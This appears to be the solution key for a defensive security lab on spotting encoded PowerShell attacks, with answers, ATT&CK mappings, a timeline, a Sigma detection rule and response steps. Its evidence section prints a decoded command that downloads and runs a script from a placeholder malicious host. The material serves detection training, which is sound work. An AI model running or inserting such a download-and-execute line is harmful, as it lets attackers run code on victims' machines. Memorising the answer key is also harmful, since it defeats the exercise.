# Lab 11: Solution

## Answers

| # | Answer |
|---|--------|
| 1 | **T1059.001 - PowerShell** |
| 2 | **powershell.exe** |
| 3 | **Base64 encoded command in CommandLine** |
| 4 | **Sigma rule + Process monitoring** |
| 5 | **Isolate host, analyze, block PowerShell restrictions** |

## MITRE ATT&CK Mapping

| Observed Behavior | Technique ID | Technique Name |
|-------------------|--------------|----------------|
| PowerShell execution | T1059.001 | PowerShell |
| Encoded command | T1027 | Obfuscated Files |
| Admin execution | T1078 | Valid Accounts |

## Investigation

### Timeline
```
14:00 - User logs in (normal)
14:15 - First PowerShell -enc execution
14:30 - Multiple executions detected (15 total)
14:45 - Alert triggered
```

### Evidence Found
```
Process: powershell.exe (PID 1234)
Parent: cmd.exe
Command: powershell -enc SQBFAFgAIAA...
Decoded: IEX((New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1'))
```

## Detection Rule (Sigma)

```yaml
title: PowerShell Encoded Command Suspicious
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    ProcessName|endswith: '\powershell.exe'
    CommandLine|contains: '-enc'
  condition: selection
level: high
```

## Recommended Response

1. **Immediate**: Isolate affected workstation
2. **Short-term**: Block PowerShell scripting via GPO
3. **Long-term**: User awareness training
4. **Documentation**: Create detection rule in SIEM